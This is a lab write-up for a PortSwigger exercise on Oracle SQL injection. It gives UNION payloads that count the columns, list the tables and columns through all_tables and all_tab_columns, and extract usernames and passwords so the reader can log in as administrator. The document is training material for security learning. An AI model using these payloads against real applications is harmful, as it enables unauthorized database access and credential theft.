# [Lab 6: SQL Injection Attack, Listing the Database Contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)


### Overview
This lab demonstrates a SQL injection attack that allows an attacker to list the contents of an Oracle database. The vulnerability exists in the product category filter, and a UNION attack is used to retrieve data from other tables, including usernames and passwords.

### Steps to Exploit

1. **Identify the Number of Columns:**
   - Use the following payload to determine the number of columns (using `dual` since it is Oracle):
     ```plaintext
     category=Gifts' UNION SELECT NULL,NULL FROM dual -- -
     ```
   - This confirms that the query returns two columns.

2. **List Tables:**
   - Retrieve the list of tables using:
     ```plaintext
     category=Gifts' UNION SELECT table_name,NULL FROM all_tables -- -
     ```
   - The response shows the available tables.

3. **List Columns in 'USERS_XZCXJV' Table:**
   - Retrieve the list of columns in the 'USERS_XZCXJV' table using:
     ```plaintext
     category=Gifts' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_XZCXJV' -- -
     ```
   - The response shows the columns in the 'USERS_XZCXJV' table.

4. **Retrieve Usernames and Passwords:**
   - Retrieve the usernames and passwords from the 'USERS_XZCXJV' table using:
     ```plaintext
     category=Gifts' UNION SELECT USERNAME_ZNUEXN,PASSWORD_QCIJDG FROM USERS_XZCXJV -- -
     ```
   - The response shows the usernames and passwords.

5. **Login with Retrieved Credentials:**
   - Log in with the credentials for the 'administrator' user to solve the lab.
